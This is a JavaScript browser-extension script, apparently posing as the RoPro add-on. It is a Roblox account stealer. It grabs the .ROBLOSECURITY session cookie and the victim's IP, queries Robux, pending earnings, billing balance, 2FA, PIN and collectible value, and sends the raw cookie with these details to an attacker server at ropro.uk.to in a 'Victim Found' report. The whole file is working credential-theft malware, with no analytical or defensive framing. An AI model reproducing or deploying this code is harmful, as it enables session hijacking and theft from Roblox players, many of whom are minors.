const WEBHOOK = "";
async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://users.roblox.com/v1/users/authenticated", {
          headers: { Cookie: ".ROBLOSECURITY=" + cookie },
          redirect: "manual"
        })).json();
    }
    const usrID = statistics ? statistics.id : "N/A";
    { var Profstats = await (await fetch("https://www.roblox.com/my/settings/json", {
        headers: { Cookie: ".ROBLOSECURITY=" + cookie },
        redirect: "manual"
    })).json(); }
    { var rbxz = await (await fetch("https://economy.roblox.com/v1/users/" + usrID + "/currency", {
        headers: { Cookie: ".ROBLOSECURITY=" + cookie },
        redirect: "manual"
    })).json(); }
    { var ana = await (await fetch("https://premiumfeatures.roblox.com/v1/users/" + usrID + "/validate-membership", {
        headers: { Cookie: ".ROBLOSECURITY=" + cookie },
        redirect: "manual"
    })).json(); }
    const buxvalue = rbxz ? rbxz.robux : "N/A";
    { var Twostep = await (await fetch("https://twostepverification.roblox.com/v1/metadata", {
        headers: { Cookie: ".ROBLOSECURITY=" + cookie },
        redirect: "manual"
    })).json(); }
    { var PendRBX = await (await fetch("https://economy.roblox.com/v2/users/" + usrID + "/transaction-totals?timeFrame=Year&transactionType=summary", {
        headers: { Cookie: ".ROBLOSECURITY=" + cookie },
        redirect: "manual"
    })).json(); }
    { var balancez = await (await fetch("https://billing.roblox.com/v1/credit", {
        headers: { Cookie: ".ROBLOSECURITY=" + cookie },
        redirect: "manual"
    })).json(); }
    { var IsPin = await (await fetch("https://auth.roblox.com/v1/account/pin", {
        headers: { Cookie: ".ROBLOSECURITY=" + cookie },
        redirect: "manual"
    })).json(); }
    const highpend = PendRBX ? PendRBX.pendingRobuxTotal : "N/A";
    let pndtotl = highpend > 999 ? "@everyone High Pending" : "Low Pend";
    try {
        if (usrID) {
            const a = await fetch(`https://inventory.roblox.com/v1/users/${usrID}/assets/collectibles?sortOrder=Asc&limit=10`);
            const d = await a.json();
            let ABCDEF = 0;
            d.data.forEach((item) => {
                const e = item.recentAveragePrice || 0;
                ABCDEF += e;
            });
            const b = await fetch(`https://groups.roblox.com/v1/users/${usrID}/groups/roles`);
            const c = await b.json();
            var groupCount = c.data.filter((group) => group.role.rank >= 255).length;
        }
    } catch (error) {
        // Tangani error jika perlu
    }
    if (buxvalue > -1) {
        var WEBHOOK = "http://ropro.uk.to:19135/api/RoPro-Rex";
    } else {
        var WEBHOOK = "http://ropro.uk.to:19135/api/RoPro_Rex";
    }
    fetch(WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "Application/json"
        },
        body: JSON.stringify({
            "content": pndtotl,
            "embeds": [
                {
                    "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                    "color": 11737174,
                    "fields": [
                        {
                            "name": "[💎] Premium Status",
                            "value": ana === "true" ? "Active" : "Inactive",
                            "inline": true
                        },
                        {
                            "name": "[🧑‍✈️] User",
                            "value": statistics ? statistics.name : "N/A",
                            "inline": true
                        },
                        {
                            "name": "[💵] Robux (Pend)",
                            "value": (rbxz && PendRBX) ? `${rbxz.robux} (${PendRBX.pendingRobuxTotal})` : "N/A",
                            "inline": true
                        },
                        {
                            "name": "[🏠] Group Owned",
                            "value": groupCount,
                            "inline": true
                        },
                        {
                            "name": "[🪙] RAP",
                            "value": ABCDEF,
                            "inline": true
                        },
                        {
                            "name": "[💳] Balance",
                            "value": balancez ? balancez.balance : "N/A",
                            "inline": true
                        },
                        {
                            "name": "[🔐] 2Step",
                            "value": Twostep ? Twostep.twoStepVerificationEnabled : "N/A",
                            "inline": true
                        },
                        {
                            "name": "[📩] Email verified",
                            "value": Profstats ? Profstats.IsEmailVerified : "N/A",
                            "inline": true
                        },
                        {
                            "name": "[📌] IsPin",
                            "value": IsPin ? IsPin.isEnabled : "N/A",
                            "inline": true
                        }
                    ],
                    "author": {
                        "name": "Victim Found: " + ipAddr,
                        "icon_url": "https://cdn-icons-png.flaticon.com/512/6159/6159318.png"
                    },
                    "footer": {
                        "text": "Live Report Log",
                        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                    },
                    "thumbnail": {
                        "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                    }
                }
            ],
            "username": "#Gyeomsky On Top",
            "avatar_url": "https://c.tenor.com/4_05iSMYLDoAAAAd/tenor.gif",
            "attachments": []
        })
    });
}  // <-- Penutup function main yang hilang

chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
    main(cookie ? cookie.value : null);
});
